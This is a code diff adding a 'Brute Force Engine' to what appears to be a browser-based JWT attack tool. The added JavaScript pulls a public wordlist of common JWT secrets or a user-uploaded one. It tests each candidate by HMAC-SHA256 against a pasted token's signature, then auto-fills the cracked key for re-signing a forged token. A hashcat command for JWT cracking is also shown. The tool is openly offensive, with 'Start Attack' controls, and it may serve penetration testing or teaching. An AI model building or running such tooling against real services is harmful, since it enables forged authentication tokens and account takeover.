@@ -1082,6 +1082,156 @@
                 transform: scale(1);
             }
         }
+
+        /* Brute Force UI */
+        .brute-force-panel {
+            grid-column: 1 / -1;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: var(--radius-sm);
+            padding: 1.5rem;
+            margin-top: 1rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1.25rem;
+            animation: fadeIn 0.4s ease;
+        }
+
+        .brute-force-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .brute-force-title {
+            font-size: 0.9rem;
+            font-weight: 700;
+            color: var(--accent-amber);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .brute-force-controls {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .brute-force-btn {
+            padding: 8px 16px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: 1px solid transparent;
+        }
+
+        .btn-start {
+            background: rgba(34, 197, 94, 0.1);
+            color: var(--accent-green);
+            border-color: rgba(34, 197, 94, 0.2);
+        }
+
+        .btn-start:hover:not(:disabled) {
+            background: rgba(34, 197, 94, 0.2);
+            box-shadow: 0 0 15px var(--accent-green-glow);
+        }
+
+        .btn-stop {
+            background: rgba(239, 68, 68, 0.1);
+            color: var(--accent-red);
+            border-color: rgba(239, 68, 68, 0.2);
+        }
+
+        .btn-stop:hover {
+            background: rgba(239, 68, 68, 0.2);
+            box-shadow: 0 0 15px var(--accent-red-glow);
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 5px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--accent-amber), var(--accent-primary));
+            transition: width 0.3s ease;
+        }
+
+        .brute-force-status {
+            font-size: 0.75rem;
+            color: var(--text-secondary);
+            font-family: var(--font-mono);
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .status-found {
+            color: var(--accent-green) !important;
+            font-weight: 700;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
+
+        .wordlist-selector {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .wordlist-option {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .wordlist-option:hover {
+            background: rgba(255, 255, 255, 0.06);
+            border-color: var(--accent-primary);
+        }
+
+        .wordlist-option.active {
+            border-color: var(--accent-primary);
+            background: rgba(99, 102, 241, 0.08);
+        }
+
+        .wordlist-icon {
+            font-size: 1.25rem;
+        }
+
+        .wordlist-label {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .wordlist-name {
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+
+        .wordlist-desc {
+            font-size: 0.65rem;
+            color: var(--text-muted);
+        }
     </style>
 </head>
 
@@ -1288,6 +1438,7 @@
                 desc: 'If HS256 secret is weak, brute-force it with hashcat/jwt_tool, then re-sign a modified token with the known secret.',
                 fields: [
                     { id: 'secret_key', label: 'Known/Cracked Secret Key', type: 'text', value: 'secret1', hint: 'The secret found via hashcat' },
+                    { id: 'brute_force', label: 'Hashcat Brute Force Tool', type: 'brute_force_tool' },
                     { id: 'payload_claims', label: 'Payload Claims', type: 'claims_builder' },
                     { id: 'custom_claims', label: 'Raw Overrides (JSON)', type: 'textarea', value: '', hint: 'Optional extra claims to merge' }
                 ],
@@ -1470,6 +1621,51 @@
                             <button class="add-claim-btn" onclick="addClaimRow()">➕ Add Claim</button>
                         </div>
                     `;
+                } else if (f.type === 'brute_force_tool') {
+                    fieldsHTML += `
+                        <div class="brute-force-panel" id="bruteForcePanel">
+                            <div class="brute-force-header">
+                                <div class="brute-force-title">🚀 Brute Force Engine (hashcat-style)</div>
+                                <div class="brute-force-controls">
+                                    <button class="brute-force-btn btn-start" id="bruteStartBtn" onclick="startBruteForce()">⚡ Start Attack</button>
+                                    <button class="brute-force-btn btn-stop" id="bruteStopBtn" onclick="stopBruteForce()" style="display:none">⏹ Stop</button>
+                                </div>
+                            </div>
+
+                            <div class="wordlist-selector">
+                                <div class="wordlist-option active" id="wl-builtin" onclick="setWordlist('builtin')">
+                                    <div class="wordlist-icon">📚</div>
+                                    <div class="wordlist-label">
+                                        <span class="wordlist-name">Built-in List</span>
+                                        <span class="wordlist-desc">~1.3k common secrets</span>
+                                    </div>
+                                </div>
+                                <div class="wordlist-option" id="wl-upload" onclick="triggerFileUpload()">
+                                    <div class="wordlist-icon">📤</div>
+                                    <div class="wordlist-label">
+                                        <span class="wordlist-name">Upload custom...</span>
+                                        <span class="wordlist-desc">Select a .txt wordlist</span>
+                                    </div>
+                                    <input type="file" id="wordlistFile" accept=".txt" style="display:none" onchange="handleFileUpload(event)">
+                                </div>
+                            </div>
+
+                            <div class="brute-force-status" style="margin-top: 5px; opacity: 0.7; font-size: 0.65rem;">
+                                <span>Hashcat Reference Command:</span>
+                                <code id="hashcatCmd">hashcat -a 0 -m 16500 &lt;jwt&gt; jwt.secrets.list</code>
+                            </div>
+
+                            <div id="bruteProgressArea" style="display:none">
+                                <div class="progress-container">
+                                    <div class="progress-bar" id="bruteProgressBar"></div>
+                                </div>
+                                <div class="brute-force-status">
+                                    <span id="bruteStatusText">Initializing...</span>
+                                    <span id="bruteCountText">0/0</span>
+                                </div>
+                            </div>
+                        </div>
+                    `;
                 } else if (f.type === 'select') {
                     fieldsHTML += `
                     <div class="config-field">
@@ -1584,6 +1780,157 @@
                 select.style.display = 'block';
                 select.value = 'sub';
             }
+        }
+
+        // ========== BRUTE FORCE ENGINE ==========
+        let bruteWordlist = [];
+        let isBruteRunning = false;
+        let bruteCurrentIndex = 0;
+        let bruteTargetToken = '';
+        let bruteBuiltInList = null; // Cache
+
+        function setWordlist(mode) {
+            if (isBruteRunning) return;
+            document.getElementById('wl-builtin').classList.toggle('active', mode === 'builtin');
+            document.getElementById('wl-upload').classList.toggle('active', mode === 'upload');
+            if (mode === 'builtin') bruteWordlist = null; // Signal to fetch on start
+        }
+
+        function triggerFileUpload() {
+            if (isBruteRunning) return;
+            document.getElementById('wordlistFile').click();
+        }
+
+        function handleFileUpload(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                const text = e.target.result;
+                bruteWordlist = text.split(/\r?\n/).filter(line => line.trim() !== '');
+                setWordlist('upload');
+                document.getElementById('hashcatCmd').textContent = `hashcat -a 0 -m 16500 <jwt> ${file.name}`;
+                showToast(`📂 Custom wordlist loaded: ${bruteWordlist.length} keys`);
+            };
+            reader.readAsText(file);
+        }
+
+        async function fetchBuiltInWordlist() {
+            if (bruteBuiltInList) return bruteBuiltInList;
+            try {
+                const response = await fetch('https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list');
+                const text = await response.text();
+                bruteBuiltInList = text.split(/\r?\n/).filter(line => line.trim() !== '');
+                return bruteBuiltInList;
+            } catch (e) {
+                showToast('❌ Failed to fetch built-in wordlist. Please upload one.', true);
+                return null;
+            }
+        }
+
+        async function startBruteForce() {
+            const token = document.getElementById('jwtInput').value.trim();
+            if (!token) {
+                showToast('⚠️ Please paste a target JWT first!', true);
+                return;
+            }
+
+            // Get wordlist if needed
+            if (!bruteWordlist || bruteWordlist.length === 0) {
+                showToast('⏳ Fetching built-in wordlist...');
+                const list = await fetchBuiltInWordlist();
+                if (!list) return;
+                bruteWordlist = list;
+            }
+
+            bruteTargetToken = token;
+            bruteCurrentIndex = 0;
+            isBruteRunning = true;
+
+            // UI Update
+            document.getElementById('bruteStartBtn').disabled = true;
+            document.getElementById('bruteStartBtn').style.opacity = '0.5';
+            document.getElementById('bruteStopBtn').style.display = 'block';
+            document.getElementById('bruteProgressArea').style.display = 'block';
+            document.getElementById('bruteStatusText').textContent = 'Attack in progress...';
+            document.getElementById('bruteStatusText').className = '';
+
+            findKeyChunked();
+        }
+
+        function stopBruteForce() {
+            isBruteRunning = false;
+            document.getElementById('bruteStartBtn').disabled = false;
+            document.getElementById('bruteStartBtn').style.opacity = '1';
+            document.getElementById('bruteStopBtn').style.display = 'none';
+            document.getElementById('bruteStatusText').textContent = 'Attack stopped.';
+        }
+
+        async function findKeyChunked() {
+            if (!isBruteRunning) return;
+
+            const parts = bruteTargetToken.split('.');
+            if (parts.length !== 3) {
+                showToast('⚠️ Invalid JWT format', true);
+                stopBruteForce();
+                return;
+            }
+
+            const dataToSign = parts[0] + '.' + parts[1];
+            const targetSignature = parts[2];
+            const chunkSize = 100; // Check 100 keys per frame
+            const end = Math.min(bruteCurrentIndex + chunkSize, bruteWordlist.length);
+
+            for (let i = bruteCurrentIndex; i < end; i++) {
+                const secret = bruteWordlist[i];
+                const signature = await hmacSha256Sign(dataToSign, secret);
+                
+                if (signature === targetSignature) {
+                    // FOUND!
+                    isSuccess(secret);
+                    return;
+                }
+            }
+
+            bruteCurrentIndex = end;
+            updateBruteProgress();
+
+            if (bruteCurrentIndex < bruteWordlist.length) {
+                requestAnimationFrame(findKeyChunked);
+            } else {
+                // FINISHED - NOT FOUND
+                isBruteRunning = false;
+                document.getElementById('bruteStatusText').textContent = 'Attack finished. No key found.';
+                document.getElementById('bruteStartBtn').disabled = false;
+                document.getElementById('bruteStartBtn').style.opacity = '1';
+                document.getElementById('bruteStopBtn').style.display = 'none';
+            }
+        }
+
+        function updateBruteProgress() {
+            const percent = (bruteCurrentIndex / bruteWordlist.length) * 100;
+            document.getElementById('bruteProgressBar').style.width = `${percent}%`;
+            document.getElementById('bruteCountText').textContent = `${bruteCurrentIndex}/${bruteWordlist.length}`;
+        }
+
+        function isSuccess(key) {
+            isBruteRunning = false;
+            const statusEl = document.getElementById('bruteStatusText');
+            statusEl.textContent = `SUCCESS! Key Found: ${key}`;
+            statusEl.className = 'status-found';
+            
+            // Auto-fill the key
+            document.getElementById('cfg-secret_key').value = key;
+            
+            document.getElementById('bruteStartBtn').disabled = false;
+            document.getElementById('bruteStartBtn').style.opacity = '1';
+            document.getElementById('bruteStopBtn').style.display = 'none';
+            
+            showToast('💎 Key Found and applied!');
+            
+            // Pulse the progress bar
+            document.getElementById('bruteProgressBar').style.background = 'var(--accent-green)';
         }
 
         // ========== GENERATE PAYLOAD ==========
